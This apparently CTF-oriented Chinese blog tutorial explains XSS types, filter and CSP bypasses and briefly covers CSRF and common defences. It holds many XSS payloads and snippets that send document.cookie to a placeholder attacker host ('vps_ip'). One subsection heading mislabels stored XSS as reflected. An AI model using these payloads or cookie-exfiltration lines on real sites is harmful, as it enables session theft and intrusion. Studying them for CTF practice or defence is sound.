---
title: "XSS & CSRF"
description: "XSS 与 CSRF 漏洞总结，梳理攻击场景、风险影响和常见防护方式。"
pubDate: "2026-03-26"
updatedDate: "2026-03-26"
tags: ["XSS", "CSRF", "Web安全"]
cover: auto
coverAlt: "XSS & CSRF 的文章封面"
draft: false
---
## XSS

首先我们讲一讲XSS，XSS有三种类型，存储型，反射型和Dom型

### 反射型XSS

存储型 XSS 相比反射型 XSS 来说危害较大。在这种 XSS 漏洞中，攻击者能够把攻击载荷存入服务器的数据库中，造成持久化的攻击。

各类 Web 应用的评论区中常常存在 XSS 漏洞，具体表现在展示用户输入的内容时常常忘记对一些恶意内容进行过滤，从而使所有访问到这个页面的用户都会受到攻击。这个攻击过程通常是难以察觉的，因此危害性巨大。

### 反射型 XSS

反射型 XSS，也叫非持久型 XSS。一般情况下，恶意代码存放在 URL 的 GET 参数中，当用户点击这个链接就会触发 XSS，就像上面的例题一样。

这种 XSS 的重灾区一类是 Web 应用的报错界面，在 GET 参数中传入了报错信息，然后后端服务器根据这个信息渲染具体错误。

### DOM 型 XSS

文档对象模型（DOM）是一个网络文档的编程接口。它代表页面，以便程序可以改变文档的结构、风格和内容。DOM 将文档表示为节点和对象；这样，编程语言就可以与页面交互。简单来说就是可以通过 JavaScript 脚本来控制 HTML 文档中的内容。

在 XSS 中，DOM 型 XSS 主要发生于 JS 脚本创建页面元素时（可能只进行了简单的拼接）。其实它的原理和反射型 XSS 大致上类似，只不过一个页面是由后端产生，一个页面是前端动态生成。

一段存在 DOM 型 XSS 的 JS 代码：

```
var search = document.getElementById('search').value;
var results = document.getElementById('results');
results.innerHTML = 'You searched for: ' + search;
//                                      ^^^^^^^^^^ 直接拼接 
```

平时在CTF中一般是DOM型和反射型XSS比较多，一般还会存在一个管理员bot，我们可以通过数据外带，将管理员的cookie偷过来，或者诱使管理员去做一些事件，这些都要看具体题目场景。

在真实场景中反射型XSS主要用于钓鱼网站需要攻击者主动寻找目标，诱导其访问恶意网址，而存储型XSS确是一个攻击面非常广的XSS，危害性会更大，这也是为什么存储型XSS造成的危害比另外两种XSS大得多的原因。

### XSS利用

然后我们讲一下XSS怎么利用来攻击，一般来讲，XSS的payload是需要根据其页面的设计来构建的，但是使用的手法是比较常见的

无过滤情况下可以这么玩,参考(XSS)[https://www.cnblogs.com/sfsec/p/15178028.html]

```html
<scirpt>

<scirpt>alert("xss");</script>

<img>

<img src=1 onerror=alert("xss");>

<input>

<input onfocus="alert('xss');">

竞争焦点，从而触发onblur事件
<input onblur=alert("xss") autofocus><input autofocus>

通过autofocus属性执行本身的focus事件，这个向量是使焦点自动跳到输入元素上,触发焦点事件，无需用户去触发
<input onfocus="alert('xss');" autofocus>

<details>

<details ontoggle="alert('xss');">

使用open属性触发ontoggle事件，无需用户去触发
<details open ontoggle="alert('xss');">

<svg>

<svg onload=alert("xss");>

<select>

<select onfocus=alert(1)></select>

通过autofocus属性执行本身的focus事件，这个向量是使焦点自动跳到输入元素上,触发焦点事件，无需用户去触发
<select onfocus=alert(1) autofocus>

<iframe>

<iframe onload=alert("xss");></iframe>

<video>

<video><source onerror="alert(1)">

<audio>

<audio src=x  onerror=alert("xss");>

<body>

<body/onload=alert("xss");>

利用换行符以及autofocus，自动去触发onscroll事件，无需用户去触发

<body
onscroll=alert("xss");><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><input autofocus>

<textarea>

<textarea onfocus=alert("xss"); autofocus>

<keygen>

<keygen autofocus onfocus=alert(1)> //仅限火狐

<marquee>

<marquee onstart=alert("xss")></marquee> //Chrome不行，火狐和IE都可以

<isindex>

<isindex type=image src=1 onerror=alert("xss")>//仅限于IE

利用link远程包含js文件

PS：在无CSP的情况下才可以

<link rel=import href="http://127.0.0.1/1.js">

javascript伪协议

<a>标签

<a href="javascript:alert(`xss`);">xss</a>

<iframe>标签

<iframe src=javascript:alert('xss');></iframe>

<img>标签

<img src=javascript:alert('xss')>//IE7以下

<form>标签

<form action="Javascript:alert(1)"><input type=submit>

其它

expression属性

<img style="xss:expression(alert('xss''))"> // IE7以下
<div style="color:rgb(''�x:expression(alert(1))"></div> //IE7以下
<style>#test{x:expression(alert(/XSS/))}</style> // IE7以下

background属性

<table background=javascript:alert(1)></table> //在Opera 10.5和IE6上有效
```

在有url的地方也可以考虑data协议，data:

然后我们讲讲如何绕过过滤

### XSS过滤绕过

- 常见的有各种编码绕过，如unicode编码，url编码，hex编码，八进制编码，base64等
- 当存在空格过滤时用/来绕过  ```<img/src="x"/onerror=alert("xss");>```
- 大小写绕过关键字  ```<ImG sRc=x onerRor=alert("xss");>```
- 双写关键字绕过
- 用eval进行字符拼接或者是使用top ```<img src="x" onerror="a=`aler`;b=`t`;c='(`xss`);';eval(a+b+c)">   <script>top["al"+"ert"](`xss`);</script>```
- 单引号和双引号绕过使用反引号或者各种编码
- 过滤括号可以使用throw抛出错误，```<svg/onload="window.onerror=eval;throw'=alert\x281\x29';">```
- 过滤url地址可以各种进制编码，或者html标签中用//可以代替http://，还可以使用\\，报告在windows中不能这么用，中文的句号也可以自动转化

### XSS的防御

常见的就是对输入进行转义，HTTP-only cookie，启用CSP，开启dompurify，设置输入长度限制，顺带一提输入长度限制可能会被location.hash绕过请注意

### CSP是什么(参考mdn)[https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Guides/CSP]

内容安全策略（CSP）是一个额外的安全层，用于检测并削弱某些特定类型的攻击，包括跨站脚本（XSS）和数据注入攻击等。无论是数据盗取、网站内容污染还是恶意软件分发，这些攻击都是主要的手段。

CSP 的主要目标是减少和报告 XSS 攻击。XSS 攻击利用了浏览器对于从服务器所获取的内容的信任。恶意脚本在受害者的浏览器中得以运行，因为浏览器信任其内容来源，即使有的时候这些脚本并非来自于它本该来的地方。

CSP 通过指定有效域——即浏览器认可的可执行脚本的有效来源——使服务器管理者有能力减少或消除 XSS 攻击所依赖的载体。一个 CSP 兼容的浏览器将会仅执行从白名单域获取到的脚本文件，忽略所有的其他脚本（包括内联脚本和 HTML 的事件处理属性）。

作为一种终极防护形式，始终不允许执行脚本的站点可以选择全面禁止脚本执行。

```
Content-Security-Policy: policy
```

策略由一系列策略指令所组成，每个策略指令都描述了针对某个特定资源的类型以及策略生效的范围。你的策略应当包含一个 default-src 策略指令，在其他资源类型没有符合自己的策略时应用该策略（有关完整列表，请查看 default-src 指令的描述）。一个策略可以包含 default-src 或者 script-src 指令来防止内联脚本运行，并杜绝 eval() 的使用。一个策略也可包含一个 default-src 或 style-src 指令去限制来自一个 <style> 元素或者 style 属性的內联样式。对于不同类型的项目都有特定的指令，因此每种类型都可以有自己的指令，包括字体、frame、图像、音频和视频媒体、script 和 worker。

### 怎么绕过CSP

#### link

```
<!-- firefox -->
<link rel="dns-prefetch" href="//${cookie}.vps_ip">

<!-- chrome -->
<link rel="prefetch" href="//vps_ip?${cookie}">
```

这个绕法有点老，适用于老浏览器。

或者

```
var link = document.createElement("link");
link.setAttribute("rel", "prefetch");
link.setAttribute("href", "//vps_ip/?" + document.cookie);
document.head.appendChild(link);
```

适用于开启CSP但是可以植入脚本的情况

#### iframe

还有一种是iframe，当存在一个同源站点，有一个A页面，一个B页面，其中一个页面存在XSP一个没有，没有CSP的那个页面存在XSS漏洞，就可以使用iframe去包含A页面，操作A页面的Dom，举个例子

```
<! A页面 >
<meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self'">

<h1 id="flag">flag{0xffff}</h1>
```

```
<! B页面 >

<! 下面模拟XSS >

<body>

<script>

var iframe = document.createElement('iframe');

iframe.src="A页面";

document.body.appendChild(iframe);

setTimeout(()=>alert(iframe.contentWindow.document.getElementById('flag').innerHTML),1000);

</script>

</body>

```

#### CDN

还有一种就是使用CDN来绕过，有许多网站都会使用CDN中的js框架，当该框架的版本比较老时就可以实现XSS

利用条件如下
- 1. CDN服务商存在某些低版本的js库
- 2. 此CDN服务商在CSP白名单中

#### 静态资源

还有就是站内存在可控静态资源，这种得要看具体场景

#### jsonp

大部分站点的jsonp是完全可控的，只不过有些站点会让jsonp不返回html类型防止直接的反射型XSS，但是如果将url插入到script标签中，除非设置x-content-type-options头，否则尽管返回类型不一致，浏览器依旧会当成js进行解析

举个例子

```
Content-Security-Policy: script-src www.google.com; img-src *; default-src 'none'; style-src 'unsafe-inline'
```

对于这个情况就可以使用google的jsonp

```html
<meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src https://www.google.com">
<script src="https://www.google.com/complete/search?client=chrome&q=hello&callback=alert"></script>
```

#### BASE-uri

- 1. script-src只使用nonce
- 2. 没有额外设置base-uri
- 3. 页面引用存在相对路径的<script>标签

满足这几个条件即可利用

```
<meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'nonce-test'">
<base href="//vps_ip/">
<script nonce='test' src="2.js"></script>
```

#### 不完整script标签绕过nonce

```html
<?php header("X-XSS-Protection:0");?>
<meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'nonce-xxxxx'">
<?php echo $_GET['xss']?>
<script nonce='xxxxx'>
  //do some thing
</script>
```

当这个情况的时候，我们可以通过传`?xss=<script src=data:text/plain,alert(1)`来实现XSS

因为当浏览器读到左尖括号时会自动变成标签开启状态，然后会一直持续到碰到右尖括号为止，在其中的数据都会被当成标签名或者属性，而下方的script会变成一个属性，值为空，而之后的nonce='xxxxx'会被当成我们输入的script的标签的一个属性，相当于我们盗取了合法的script标签中的nonce，于是成功绕过了scripr-src

但是在chrome里会报错，第二个`<script`会干扰chrome解析，我们可以利用两个相同属性，第二个会被忽略的原理来绕过

```html
?xss=123<script src="data:text/plain,alert(1)" a=123 a=
```
将第二个`<script`赋值给a来忽略。

条件

- 可控点在合法script标签上方,且其中没有其他标签
- XSS页面的CSP script-src只采用了nonce方式

#### PDFXSS

适用于chrome的默认解析器，条件为

- 没有设置object-src，或者object-src没有设置为'none'
- pdf用的是chrome的默认解析器
#### svg

存在文件上传点且可查看上传文件，可以利用svg来实现xss

```html
<?xml version="1.0" encoding="UTF-8" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg version="1.1" id="Layer_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="100px" height="100px" viewBox="0 0 751 751" enable-background="new 0 0 751 751" xml:space="preserve">  <image id="image0" width="751" height="751" x="0" y="0"
    href="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAu8AAALvCAIAAABa4bwGAAAAIGNIUk0AAHomAACAhAAA+gAAAIDo" />
<script>alert(1)</script>
</svg>
```

#### 不完整的外部资源标签

一般来将img的CSP设置都比较宽松

可以通过没闭合的img标签来数据外带

```html
xss=<img src="//VPS_IP?a=
```

不过chrome不行

#### CRLF绕过

这个要结合CRLF漏洞使用，利用回车换行改变请求格式

### Dompurify

Dompurify是一个常用的XSS过滤器，对于其的绕过可以找一些专门的CVE和文章，这里不过多说明。

## CSRF

CSRF在CTF中不常见，但是在现实中经常会和XSS连用形成一个钓鱼网站，本质上就是可以诱导用户访问危险的网站，对于存在CSRF漏洞的网站进行操作，模仿用户行为来对用户造成危害

防御一般主要着手于referer，csrf令牌，使用token进行验证，验证码，使用samesite属性等。